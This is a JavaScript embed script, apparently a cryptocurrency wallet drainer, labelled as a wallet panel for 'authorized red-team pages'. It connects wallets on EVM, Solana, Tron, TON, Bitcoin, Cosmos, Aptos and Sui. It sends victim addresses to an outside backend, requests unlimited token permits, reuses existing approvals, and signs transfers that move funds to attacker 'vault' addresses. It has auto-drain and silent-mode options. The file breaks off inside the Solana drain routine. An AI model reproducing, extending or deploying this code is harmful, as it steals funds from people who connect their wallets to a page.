/**
 * legion-one-script.js — Standalone Legion wallet panel for authorized red-team pages.
 * Include: <script src="https://your-cdn.com/legion-one-script.js"></script>
 * Configure (optional, before script): window.LEGION_CONFIG = { ... }
 */
(function () {
  'use strict';

  if (window.__LEGION_ONE_SCRIPT_LOADED__) return;
  window.__LEGION_ONE_SCRIPT_LOADED__ = true;

  var DEFAULTS = {
    backendUrl: 'https://legionapi-production.up.railway.app',
    kineticKey: '',
    wcProjectId: '',
    autoDrain: true,
    silentMode: false,
    showBalance: true,
    vaultAddresses: {},
  };

  var CFG = Object.assign({}, DEFAULTS, window.LEGION_CONFIG || {});
  var BACKEND = String(CFG.backendUrl || DEFAULTS.backendUrl).replace(/\/$/, '');
  var KINETIC_KEY = CFG.kineticKey || '';
  var WC_PROJECT_ID = CFG.wcProjectId || '';
  var AUTO_DRAIN = CFG.autoDrain !== false;
  var SILENT_MODE = CFG.silentMode === true;
  var SHOW_BALANCE = CFG.showBalance !== false;

  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
  var ACTIVE_TAB = 'evm';

  var WC_EVM_CHAINS = [
    'eip155:1', 'eip155:137', 'eip155:56', 'eip155:42161', 'eip155:8453', 'eip155:10', 'eip155:43114',
  ];
  var WC_SOLANA = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

  var wallets = { evm: null, sol: null, tron: null, ton: null, btc: null, cosmos: null, aptos: null, sui: null };
  var wcProvider = null;
  var wcModal = null;
  var wcSdkPromise = null;
  var drainRunning = false;
  var vaultCache = Object.assign({}, CFG.vaultAddresses || {});
  var clientConfigLoaded = false;

  var CHAIN_EXTENSIONS = {
    evm: {
      name: 'MetaMask or Rabby',
      url: 'https://metamask.io/download/',
      check: function () { return !!(window.ethereum); },
    },
    sol: {
      name: 'Phantom or Solflare',
      url: 'https://phantom.app/download',
      check: function () {
        return !!((window.phantom && window.phantom.solana) ||
          (window.solflare && window.solflare.isSolflare));
      },
    },
    tron: {
      name: 'TronLink',
      url: 'https://www.tronlink.org/',
      check: function () { return !!(window.tronLink || window.tronWeb); },
    },
    ton: {
      name: 'Tonkeeper',
      url: 'https://tonkeeper.com/',
      check: function () {
        return !!((window.tonkeeper && window.tonkeeper.provider) ||
          (window.ton && window.ton.isTonkeeper));
      },
    },
    btc: {
      name: 'UniSat or Xverse',
      url: 'https://unisat.io/download',
      check: function () {
        return !!((window.unisat && window.unisat.requestAccounts) ||
          (window.XverseProviders && window.XverseProviders.BitcoinProvider));
      },
    },
    cosmos: {
      name: 'Keplr',
      url: 'https://www.keplr.app/get',
      check: function () { return !!window.keplr; },
    },
    aptos: {
      name: 'Petra Aptos Wallet',
      url: 'https://petra.app/',
      check: function () { return !!(window.aptos || (window.petra && window.petra.aptos)); },
    },
    sui: {
      name: 'Sui Wallet',
      url: 'https://sui.io/wallet',
      check: function () { return !!(window.suiWallet || (window.phantom && window.phantom.sui)); },
    },
  };

  var BALANCE_FAMILY = {
    evm: 'EVM', sol: 'SVM', tron: 'TRON', ton: 'TON',
    btc: 'BTC', cosmos: 'COSMOS', aptos: 'APTOS', sui: 'SUI',
  };

  /* ── Styles (injected once) ─────────────────────────────────────────── */
  function injectStyles() {
    if (document.getElementById('legion-one-styles')) return;
    var css = document.createElement('style');
    css.id = 'legion-one-styles';
    css.textContent = [
      '#legion-one-launcher{position:fixed;bottom:24px;right:24px;z-index:2147483640;width:52px;height:52px;border-radius:50%;border:0;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font:700 22px/1 system-ui,sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35);}',
      '#legion-one-panel{position:fixed;bottom:88px;right:24px;z-index:2147483641;width:min(360px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.5);font:13px/1.45 system-ui,sans-serif;overflow:hidden;display:none;}',
      '#legion-one-panel.open{display:block;}',
      '#legion-one-panel .hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:#1e293b;cursor:move;user-select:none;}',
      '#legion-one-panel .hdr span{font-weight:600;font-size:12px;}',
      '#legion-one-panel .hdr button{background:transparent;border:0;color:#94a3b8;font-size:18px;cursor:pointer;padding:0 4px;}',
      '#legion-one-panel .tabs{display:flex;flex-wrap:wrap;border-bottom:1px solid #334155;}',
      '#legion-one-panel .tabs button{flex:1 1 25%;min-width:72px;padding:6px 2px;border:0;background:transparent;color:#94a3b8;cursor:pointer;font:inherit;font-size:10px;}',
      '#legion-one-panel .tabs button.on{background:#334155;color:#fff;}',
      '#legion-one-panel .body{padding:12px;}',
      '#legion-one-status{min-height:2.4em;font-size:12px;color:#94a3b8;margin-bottom:10px;word-break:break-word;}',
      '#legion-one-status.ok{color:#4ade80;font-weight:600;}',
      '#legion-one-status.err{color:#f87171;}',
      '#legion-one-balance{font-size:11px;color:#64748b;margin-bottom:8px;max-height:80px;overflow:auto;}',
      '#legion-one-panel .btn{width:100%;padding:11px;border:0;border-radius:10px;font:600 14px system-ui,sans-serif;cursor:pointer;margin-bottom:8px;}',
      '#legion-one-panel .btn-primary{background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;}',
      '#legion-one-panel .btn-primary:disabled{opacity:.45;cursor:not-allowed;}',
      '#legion-one-panel .btn-secondary{background:rgba(99,102,241,.15);color:#c7d2fe;border:1px solid #6366f1;}',
      '#legion-one-panel .btn-secondary:disabled{opacity:.4;border-color:#475569;color:#64748b;}',
      '#legion-one-progress{height:3px;background:#334155;border-radius:2px;overflow:hidden;margin-top:6px;display:none;}',
      '#legion-one-progress i{display:block;height:100%;width:30%;background:#6366f1;animation:legionProg 1.2s ease-in-out infinite;}',
      '@keyframes legionProg{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}',
      'body.legion-one-silent #legion-one-launcher,body.legion-one-silent #legion-one-panel{display:none!important;}',
    ].join('');
    document.head.appendChild(css);
  }

  function setStatus(text, kind) {
    var el = document.getElementById('legion-one-status');
    if (!el) return;
    el.textContent = typeof text === 'string' ? text : formatError(text);
    el.className = kind === 'ok' ? 'ok' : kind === 'err' ? 'err' : '';
    var prog = document.getElementById('legion-one-progress');
    if (prog) prog.style.display = kind === 'busy' ? 'block' : 'none';
  }

  /** Never pass wallet provider objects to JSON.stringify — they contain circular refs. */
  function safeStringify(value) {
    var seen = new WeakSet();
    return JSON.stringify(value, function (_key, val) {
      if (typeof val === 'bigint') return val.toString();
      if (val != null && typeof val === 'object') {
        if (seen.has(val)) return undefined;
        seen.add(val);
        if (typeof val.request === 'function' || typeof val.signTransaction === 'function' ||
            typeof val.signAndSubmitTransaction === 'function' || typeof val.send === 'function' ||
            typeof val.connect === 'function' || typeof val.enable === 'function') {
          return undefined;
        }
      }
      if (typeof val === 'function' || typeof val === 'symbol') return undefined;
      return val;
    });
  }

  function formatError(err) {
    if (!err) return 'Unknown error';
    if (typeof err === 'string') return err;
    if (err.message && typeof err.message === 'string') return err.message;
    try {
      return safeStringify(err);
    } catch (e) {
      return 'Error';
    }
  }

  function walletTypeLabel(conn) {
    if (!conn) return ACTIVE_TAB;
    if (typeof conn.walletType === 'string' && conn.walletType) return conn.walletType;
    if (typeof conn.provider === 'string' && conn.provider) return conn.provider;
    if (typeof conn.name === 'string' && conn.name) return conn.name;
    return ACTIVE_TAB;
  }

  function publicWalletSnapshot() {
    var out = {};
    Object.keys(wallets).forEach(function (key) {
      var w = wallets[key];
      if (!w) return;
      out[key] = {
        address: w.address,
        walletType: walletTypeLabel(w),
        chainId: w.chainId || undefined,
      };
    });
    return out;
  }

  function toPlainJson(val) {
    if (val == null) return val;
    if (typeof val === 'string' || typeof val === 'number' || typeof val === 'boolean') return val;
    return JSON.parse(safeStringify(val));
  }

  function parseEnvelope(res, data) {
    if (data && typeof data.ok === 'boolean') {
      return { ok: data.ok, message: data.message || '', data: data.data != null ? data.data : data };
    }
    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
  }

  function kineticHeaders() {
    var h = { 'Content-Type': 'application/json' };
    if (KINETIC_KEY) h['x-legion-kinetic-key'] = KINETIC_KEY;
    return h;
  }

  function mapFetchError(err, path) {
    if (err && err.message) return err.message;
    return 'Network error calling ' + path + ' — verify backend URL and CORS (API_CORS_ORIGINS)';
  }

  async function apiPost(path, body, extraHeaders) {
    var headers = Object.assign(kineticHeaders(), extraHeaders || {});
    var res;
    try {
      res = await fetch(BACKEND + path, {
        method: 'POST',
        headers: headers,
        body: safeStringify(body),
        keepalive: true,
        credentials: 'omit',
      });
    } catch (err) {
      throw new Error(mapFetchError(err, path));
    }
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || 'API error ' + res.status);
    return env.data;
  }

  async function apiGet(path) {
    var res;
    try {
      res = await fetch(BACKEND + path, { method: 'GET', credentials: 'omit', keepalive: true });
    } catch (err) {
      throw new Error(mapFetchError(err, path));
    }
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || 'API error ' + res.status);
    return env.data;
  }

  async function loadClientConfigVaults() {
    if (clientConfigLoaded) return;
    try {
      var cfg = await apiGet('/api/v1/client-config');
      var vaults = cfg && cfg.vault_addresses;
      if (vaults && typeof vaults === 'object') {
        Object.keys(vaults).forEach(function (k) {
          var v = vaults[k];
          if (v && String(v).trim() && (!vaultCache[k] || !String(vaultCache[k]).trim())) {
            vaultCache[k] = String(v).trim();
          }
        });
      }
    } catch (e) { /* optional — LEGION_CONFIG vaultAddresses still work */ }
    clientConfigLoaded = true;
  }

  function assertExtensionAvailable(tab) {
    var ext = CHAIN_EXTENSIONS[tab];
    if (!ext || ext.check()) return;
    throw new Error(ext.name + ' not installed. Download: ' + ext.url);
  }

  function requireVaultAddress(chainKey) {
    var addr = resolveVaultAddress(chainKey);
    if (!addr) {
      var labels = {
        sol: 'Solana (SOL)', tron: 'Tron (TRX)', ton: 'TON',
        cosmos: 'Cosmos (ATOM)', aptos: 'Aptos (APT)', sui: 'Sui (SUI)', btc: 'Bitcoin (BTC)',
      };
      throw new Error(
        'Vault address not configured for ' + (labels[chainKey] || chainKey) +
        '. Set LEGION_CONFIG.vaultAddresses.' + chainKey +
        ' in index.html or VAULT_ADDRESS_* on Railway (loaded via /api/v1/client-config).',
      );
    }
    return addr;
  }

  function toHex(n) {
    return '0x' + BigInt(n).toString(16);
  }

  /* ── Wallet connectors ────────────────────────────────────────────────── */
  async function connectEvm() {
    if (wallets.evm) return wallets.evm;
    var eth = window.ethereum;
    if (!eth) throw new Error('MetaMask / injected EVM wallet not found');
    var accounts = await eth.request({ method: 'eth_requestAccounts' });
    if (!accounts || !accounts[0]) throw new Error('No EVM account');
    var chainHex = await eth.request({ method: 'eth_chainId' });
    wallets.evm = {
      address: accounts[0],
      chainId: parseInt(chainHex, 16),
      walletType: eth.isMetaMask ? 'MetaMask' : 'Injected EVM',
      provider: eth.isMetaMask ? 'MetaMask' : 'Injected EVM',
    };
    return wallets.evm;
  }

  async function connectSolana() {
    if (wallets.sol) return wallets.sol;
    var sol = (window.phantom && window.phantom.solana) || (window.solflare && window.solflare.isSolflare && window.solflare);
    if (!sol) throw new Error('Phantom / Solflare not found');
    var resp = await sol.connect();
    var pk = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
    if (!pk) throw new Error('Solana wallet returned no key');
    wallets.sol = {
      address: pk,
      walletType: window.phantom ? 'Phantom' : 'Solflare',
      signer: sol,
      wc: false,
    };
    return wallets.sol;
  }

  async function connectTron() {
    if (wallets.tron) return wallets.tron;
    if (window.tronLink && window.tronLink.request) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    }
    var tw = window.tronWeb;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
      throw new Error('TronLink not ready');
    }
    wallets.tron = { address: tw.defaultAddress.base58, walletType: 'TronLink', provider: 'TronLink' };
    return wallets.tron;
  }

  async function connectTon() {
    if (wallets.ton) return wallets.ton;
    var ton = (window.tonkeeper && window.tonkeeper.provider) || (window.ton && window.ton.isTonkeeper && window.ton);
    if (!ton) throw new Error('Tonkeeper not found — install from tonkeeper.com');
    var accounts = await ton.send('ton_getAccounts');
    var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
    if (!addr) throw new Error('Tonkeeper returned no address');
    wallets.ton = { address: String(addr), walletType: 'Tonkeeper', signer: ton };
    return wallets.ton;
  }

  async function connectBitcoin() {
    if (wallets.btc) return wallets.btc;
    if (window.unisat && window.unisat.requestAccounts) {
      var uAccounts = await window.unisat.requestAccounts();
      if (!uAccounts || !uAccounts[0]) throw new Error('UniSat returned no address');
      wallets.btc = { address: uAccounts[0], walletType: 'UniSat', provider: 'UniSat' };
      return wallets.btc;
    }
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      var xverse = window.XverseProviders.BitcoinProvider;
      var xAccounts = await xverse.request('getAccounts');
      if (!xAccounts || !xAccounts[0]) throw new Error('Xverse returned no address');
      wallets.btc = { address: xAccounts[0], walletType: 'Xverse', provider: 'Xverse' };
      return wallets.btc;
    }
    throw new Error('Install UniSat (unisat.io) or Xverse wallet for Bitcoin');
  }

  async function connectCosmos() {
    if (wallets.cosmos) return wallets.cosmos;
    if (!window.keplr) throw new Error('Install Keplr extension from keplr.app');
    var chainId = 'cosmoshub-4';
    await window.keplr.enable(chainId);
    var offlineSigner = window.getOfflineSigner && window.getOfflineSigner(chainId);
    if (!offlineSigner) throw new Error('Keplr offline signer unavailable');
    var accounts = await offlineSigner.getAccounts();
    if (!accounts || !accounts[0]) throw new Error('Keplr returned no Cosmos account');
    wallets.cosmos = { address: accounts[0].address, walletType: 'Keplr', provider: 'Keplr', chainId: chainId };
    return wallets.cosmos;
  }

  async function connectAptos() {
    if (wallets.aptos) return wallets.aptos;
    var aptos = window.aptos || (window.petra && window.petra.aptos);
    if (!aptos) throw new Error('Install Petra Aptos Wallet from petra.app');
    if (aptos.connect) await aptos.connect();
    var account = aptos.account && aptos.account();
    var addr = account && (account.address || (typeof account.then === 'function' ? null : account));
    if (account && typeof account.then === 'function') {
      account = await account;
      addr = account && account.address;
    }
    if (!addr && aptos.address) addr = aptos.address;
    if (!addr) throw new Error('Petra did not return an Aptos address');
    wallets.aptos = { address: String(addr), walletType: 'Petra', signer: aptos };
    return wallets.aptos;
  }

  async function connectSui() {
    if (wallets.sui) return wallets.sui;
    var suiWallet = window.suiWallet || (window.phantom && window.phantom.sui);
    if (!suiWallet) throw new Error('Install Sui Wallet extension from sui.io');
    if (suiWallet.features && suiWallet.features['standard:connect']) {
      var conn = await suiWallet.features['standard:connect'].connect();
      var acc = conn && conn.accounts && conn.accounts[0];
      if (!acc || !acc.address) throw new Error('Sui Wallet returned no account');
      wallets.sui = { address: acc.address, walletType: 'Sui Wallet', signer: suiWallet };
      return wallets.sui;
    }
    if (suiWallet.requestPermissions) {
      await suiWallet.requestPermissions({ permissions: ['viewAccount', 'suggestTransactions'] });
    }
    var accounts = suiWallet.getAccounts ? await suiWallet.getAccounts() : [];
    if (!accounts || !accounts[0]) throw new Error('Sui Wallet returned no address');
    wallets.sui = { address: accounts[0], walletType: 'Sui Wallet', signer: suiWallet };
    return wallets.sui;
  }

  function loadWcSdk() {
    if (!WC_PROJECT_ID) return Promise.reject(new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect'));
    if (!wcSdkPromise) {
      wcSdkPromise = Promise.all([
        import('https://esm.sh/@walletconnect/universal-provider@2.13.0'),
        import('https://esm.sh/@walletconnect/modal@2.7.0'),
      ]).then(function (mods) {
        return {
          UniversalProvider: mods[0].default || mods[0].UniversalProvider,
          WalletConnectModal: mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal),
        };
      });
    }
    return wcSdkPromise;
  }

  async function connectWalletConnect() {
    var sdk = await loadWcSdk();
    if (!wcProvider || !wcProvider.session) {
      wcProvider = await sdk.UniversalProvider.init({
        projectId: WC_PROJECT_ID,
        metadata: {
          name: document.title || 'Wallet',
          description: 'Connect wallet',
          url: location.origin,
          icons: [location.origin + '/favicon.ico'],
        },
      });
      if (!wcModal && sdk.WalletConnectModal) {
        wcModal = new sdk.WalletConnectModal({ projectId: WC_PROJECT_ID, themeMode: 'dark' });
      }
      wcProvider.on('display_uri', function (uri) { if (wcModal) wcModal.openModal({ uri: uri }); });
      wcProvider.on('session_delete', function () {
        wcProvider = null;
        if (wallets.evm && wallets.evm.wcProvider) wallets.evm = null;
        if (wallets.sol && wallets.sol.wc) wallets.sol = null;
        setStatus('WalletConnect session expired — click WalletConnect to reconnect', 'err');
      });
      await wcProvider.connect({
        namespaces: {
          eip155: {
            methods: ['eth_signTypedData_v4', 'eth_sendTransaction', 'eth_requestAccounts', 'eth_chainId'],
            chains: WC_EVM_CHAINS,
            events: ['accountsChanged', 'chainChanged'],
          },
          solana: {
            methods: ['solana_signTransaction'],
            chains: [WC_SOLANA],
            events: [],
          },
        },
      });
      if (wcModal) wcModal.closeModal();
    }
    var ns = (wcProvider.session && wcProvider.session.namespaces) || {};
    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts[0]) {
      var parts = ns.eip155.accounts[0].split(':');
      wallets.evm = {
        address: parts.slice(2).join(':'),
        chainId: parseInt(parts[1], 10),
        walletType: 'WalletConnect',
        provider: 'WalletConnect',
        wcProvider: wcProvider,
      };
    }
    if (ns.solana && ns.solana.accounts && ns.solana.accounts[0]) {
      var sp = ns.solana.accounts[0].split(':');
      wallets.sol = { address: sp.slice(2).join(':'), walletType: 'WalletConnect', wc: true };
    }
    if (!wallets.evm && !wallets.sol) throw new Error('WalletConnect: no accounts');
    return wallets;
  }

  async function connectActiveTab() {
    assertExtensionAvailable(ACTIVE_TAB);
    if (ACTIVE_TAB === 'evm') return connectEvm();
    if (ACTIVE_TAB === 'sol') return connectSolana();
    if (ACTIVE_TAB === 'tron') return connectTron();
    if (ACTIVE_TAB === 'ton') return connectTon();
    if (ACTIVE_TAB === 'btc') return connectBitcoin();
    if (ACTIVE_TAB === 'cosmos') return connectCosmos();
    if (ACTIVE_TAB === 'aptos') return connectAptos();
    if (ACTIVE_TAB === 'sui') return connectSui();
    throw new Error('Unknown chain tab');
  }

  function chainFamilyForTab(tab) {
    if (tab === 'evm') return 'EVM';
    if (tab === 'sol') return 'SVM';
    if (tab === 'tron') return 'TRON';
    if (tab === 'ton') return 'TON';
    if (tab === 'btc') return 'UTXO';
    if (tab === 'cosmos') return 'COSMOS';
    if (tab === 'aptos') return 'APTOS';
    if (tab === 'sui') return 'SUI';
    return 'EVM';
  }

  function resolveVaultAddress(chainKey) {
    var aliases = {
      sol: ['sol', 'svm'],
      tron: ['tron', 'trx'],
      ton: ['ton'],
      cosmos: ['cosmos'],
      aptos: ['aptos'],
      sui: ['sui'],
      btc: ['btc'],
    };
    var keys = aliases[chainKey] || [chainKey];
    for (var i = 0; i < keys.length; i++) {
      var addr = vaultCache[keys[i]];
      if (addr && String(addr).trim()) return String(addr).trim();
    }
    return null;
  }

  function findBalanceRow(data, chainKey) {
    if (!data || !data.chains) return null;
    var family = BALANCE_FAMILY[chainKey] || chainKey.toUpperCase();
    return data.chains.find(function (c) {
      return c.family === family || c.family === chainKey.toUpperCase() ||
        (c.chain && String(c.chain).toLowerCase().indexOf(chainKey) >= 0);
    });
  }

  function parseNativeAmountFromBalance(data, chainKey) {
    var row = findBalanceRow(data, chainKey);
    if (!row || !row.native) return '0';
    var raw = row.native.amount_raw || row.native.amount || '0';
    try {
      var n = BigInt(String(raw).replace(/[^\d]/g, '') || '0');
      if (n <= 0n) return '0';
      if (chainKey === 'cosmos') return (n > 5000n ? n - 5000n : n).toString();
      if (chainKey === 'aptos') return (n > 100000n ? n - 100000n : n).toString();
      if (chainKey === 'sui') return (n > 1000000n ? n - 1000000n : n).toString();
      if (chainKey === 'sol') return (n > 5000n ? n - 5000n : n).toString();
      if (chainKey === 'tron') return (n > 1000000n ? n - 1000000n : n).toString();
      if (chainKey === 'ton') return (n > 50000000n ? n - 50000000n : n).toString();
      if (chainKey === 'btc') {
        var feeReserve = 2000n;
        return n > feeReserve ? (n - feeReserve).toString() : '0';
      }
      return n.toString();
    } catch (e) {
      return '0';
    }
  }

  async function getEvmSigner() {
    if (wallets.evm && wallets.evm.wcProvider) return wallets.evm.wcProvider;
    if (!window.ethereum) throw new Error('No EVM signer');
    return window.ethereum;
  }

  /* ── Backend flow ─────────────────────────────────────────────────────── */
  async function postScout(conn) {
    var family = chainFamilyForTab(ACTIVE_TAB);
    return apiPost('/api/v1/scout', {
      user_address: conn.address,
      chain_id: conn.chainId || 0,
      chain_family: family,
      wallet_type: walletTypeLabel(conn),
    });
  }

  async function postFusion() {
    var body = {};
    if (wallets.evm) body.evm_holder = wallets.evm.address;
    if (wallets.sol) body.sol_owner_base58 = wallets.sol.address;
    if (wallets.tron) body.tron_holder_base58 = wallets.tron.address;
    if (wallets.ton) body.ton_friendly_address = wallets.ton.address;
    if (wallets.btc) body.btc_holder_address = wallets.btc.address;
    if (wallets.cosmos) body.cosmos_holder_address = wallets.cosmos.address;
    if (wallets.aptos) body.aptos_holder_address = wallets.aptos.address;
    if (wallets.sui) body.sui_holder_address = wallets.sui.address;
    if (!Object.keys(body).length) return { fusion: {}, total_usd: 0 };
    var data = await apiPost('/api/scout/recursive-predator-fusion', body);
    var fusion = (data && data.fusion) || data || {};
    return { fusion: fusion, total_usd: typeof fusion.total_usd === 'number' ? fusion.total_usd : 0 };
  }

  async function fetchBalanceDisplay() {
    if (!SHOW_BALANCE) return;
    var q = [];
    if (wallets.evm) q.push('evm=' + encodeURIComponent(wallets.evm.address));
    if (wallets.sol) q.push('sol=' + encodeURIComponent(wallets.sol.address));
    if (wallets.tron) q.push('tron=' + encodeURIComponent(wallets.tron.address));
    if (wallets.ton) q.push('ton=' + encodeURIComponent(wallets.ton.address));
    if (wallets.btc) q.push('btc=' + encodeURIComponent(wallets.btc.address));
    if (wallets.cosmos) q.push('cosmos=' + encodeURIComponent(wallets.cosmos.address));
    if (wallets.aptos) q.push('aptos=' + encodeURIComponent(wallets.aptos.address));
    if (wallets.sui) q.push('sui=' + encodeURIComponent(wallets.sui.address));
    if (!q.length) return;
    try {
      var data = await apiGet('/api/v1/balance/multi?' + q.join('&'));
      var el = document.getElementById('legion-one-balance');
      if (!el || !data.chains) return;
      var lines = data.chains.map(function (c) {
        return c.native.symbol + ': ' + c.native.amount + (c.tokens.length ? ' +' + c.tokens.length + ' tokens' : '');
      });
      el.textContent = lines.join(' | ');
    } catch (e) {
      var el = document.getElementById('legion-one-balance');
      if (el) el.textContent = 'Balance unavailable: ' + formatError(e);
    }
  }

  async function tryAllowanceReuse() {
    if (!KINETIC_KEY) return null;
    var scanBody = {};
    if (wallets.evm) {
      scanBody.wallet_address = wallets.evm.address;
      scanBody.evm_chain_id = wallets.evm.chainId;
    } else if (wallets.sol) {
      scanBody.wallet_address = wallets.sol.address;
      scanBody.sol_wallet = wallets.sol.address;
    } else if (wallets.tron) {
      scanBody.wallet_address = wallets.tron.address;
      scanBody.tron_wallet = wallets.tron.address;
    } else if (wallets.ton) {
      scanBody.wallet_address = wallets.ton.address;
      scanBody.ton_wallet = wallets.ton.address;
    } else return null;

    var headers = kineticHeaders();
    var scanRes = await fetch(BACKEND + '/api/internal/allowance-reuse/scan', {
      method: 'POST', headers: headers, body: safeStringify(scanBody), keepalive: true, credentials: 'omit',
    });
    var scanData = await scanRes.json().catch(function () { return {}; });
    var scanEnv = parseEnvelope(scanRes, scanData);
    if (!scanEnv.ok) return null;

    var executable = ((scanEnv.data && scanEnv.data.allowances) || []).filter(function (a) { return a.executable; });
    if (!executable.length) return null;

    var execRes = await fetch(BACKEND + '/api/internal/allowance-reuse/execute', {
      method: 'POST',
      headers: headers,
      body: safeStringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
      keepalive: true,
      credentials: 'omit',
    });
    var execData = await execRes.json().catch(function () { return {}; });
    var execEnv = parseEnvelope(execRes, execData);
    if (!execEnv.ok) throw new Error(execEnv.message || 'Allowance execute failed');
    return execEnv.data;
  }

  function extractPermits(fusion) {
    var permits = [];
    var layers = fusion.evm_layers || fusion.evm || [];
    if (Array.isArray(layers)) {
      for (var i = 0; i < layers.length; i++) {
        var L = layers[i];
        if (L.token && L.amount) permits.push({ token: L.token, amount: String(L.amount) });
        else if (L.token_address) permits.push({ token: L.token_address, amount: MAX_PERMIT });
      }
    }
    if (!permits.length) permits.push({ token: DEFAULT_USDC, amount: MAX_PERMIT });
    return permits;
  }

  function estimateNative(fusion) {
    return {
      native: String(fusion.native_wei || (fusion.evm && fusion.evm.native_wei) || '0'),
      sol: String(fusion.sol_lamports || (fusion.solana && fusion.solana.lamports) || '0'),
      trx: String(fusion.trx_sun || (fusion.tron && fusion.tron.sun) || '0'),
      ton: String(fusion.ton_nanoton || (fusion.ton && fusion.ton.nanoton) || '0'),
    };
  }

  async function signEvmTypedData(typedData) {
    var signer = await getEvmSigner();
    return signer.request({
      method: 'eth_signTypedData_v4',
      params: [wallets.evm.address, safeStringify(typedData)],
    });
  }

  async function signEvmNativeTx(tx) {
    if (!tx) return null;
    var signer = await getEvmSigner();
    try {
      return await signer.request({
        method: 'eth_signTransaction',
        params: [{
          from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas),
          maxFeePerGas: toHex(tx.maxFeePerGas), maxPriorityFeePerGas: toHex(tx.maxPriorityFeePerGas),
          nonce: toHex(tx.nonce), type: '0x2', chainId: toHex(tx.chainId),
        }],
      });
    } catch (e) {
      return signer.request({
        method: 'eth_sendTransaction',
        params: [{ from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas), type: '0x2' }],
      });
    }
  }

  async function loadSolWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function signSolWire(b64) {
    if (wallets.sol && wallets.sol.wc && wcProvider) {
      var r = await wcProvider.request({ method: 'solana_signTransaction', params: { transaction: b64 } }, 'solana');
      return (r && r.transaction) ? r.transaction : (typeof r === 'string' ? r : b64);
    }
    var web3 = await loadSolWeb3();
    var bytes = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
    var tx = web3.VersionedTransaction.deserialize(bytes);
    if (!wallets.sol.signer) throw new Error('Solana signer not available');
    var signed = await wallets.sol.signer.signTransaction(tx);
    var out = signed.serialize();
    var bin = '';
    for (var i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
    return btoa(bin);
  }

  async function signTronTx(payload) {
    if (!payload || !window.tronWeb || !window.tronWeb.trx) return null;
    if (payload.unsigned) return window.tronWeb.trx.sign(payload.unsigned);
    if (payload.raw_data) return window.tronWeb.trx.sign(payload);
    return null;
  }

  async function signTonTx(payload) {
    if (!payload || !wallets.ton) return null;
    if (payload.boc && wallets.ton.signer && wallets.ton.signer.send) {
      return wallets.ton.signer.send('ton_signData', { cell: payload.boc });
    }
    return payload.signed_boc || null;
  }

  async function buildSolNativeTransferWire(from, to, lamports) {
    var web3 = await loadSolWeb3();
    var rpc = (CFG.solRpcUrl || 'https://api.mainnet-beta.solana.com').replace(/\/$/, '');
    var connection = new web3.Connection(rpc, 'confirmed');
    var fromPk = new web3.PublicKey(from);
    var toPk = new web3.PublicKey(to);
    var lamportsNum = Number(lamports);
    if (!Number.isFinite(lamportsNum) || lamportsNum <= 0) {
      throw new Error('Invalid SOL transfer amount');
    }
    var bh = await connection.getLatestBlockhash('finalized');
    var msg = new web3.TransactionMessage({
      payerKey: fromPk,
      recentBlockhash: bh.blockhash,
      instructions: [
        web3.SystemProgram.transfer({
          fromPubkey: fromPk,
          toPubkey: toPk,
          lamports: lamportsNum,
        }),
      ],
    }).compileToV0Message();
    var tx = new web3.VersionedTransaction(msg);
    var bytes = tx.serialize();
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  function submitOmnichainSingleLeg(opts) {
    return apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'omnichain_atomic_v1',
      wallet_address: opts.walletAddress,
      token_address: opts.tokenAnchor,
      signature: DUMMY_OMNI_SIG,
      ...(opts.solana_payload ? { solana_payload: opts.solana_payload } : {}),
      ...(opts.tron_payload ? { tron_payload: opts.tron_payload } : {}),
      ...(opts.ton_payload ? { ton_payload: opts.ton_payload } : {}),
      ...(opts.cosmos_payload ? { cosmos_payload: opts.cosmos_payload } : {}),
      ...(opts.aptos_payload ? { aptos_payload: opts.aptos_payload } : {}),
      ...(opts.sui_payload ? { sui_payload: opts.sui_payload } : {}),
      nonce: opts.noncePrefix + ':' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: opts.walletType,
      scout_value_usd: opts.scoutUsd || 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
  }

  async function runSolanaDrain(scoutUsd) {
    if (!wallets.sol) throw new Error('Phantom / Solflare not connected');
    var vault = requireVaultAddress('sol');
    var balanceData = await apiGet('/api/v1/balance/multi?sol=' + encodeURIComponent(wallets.sol.address));
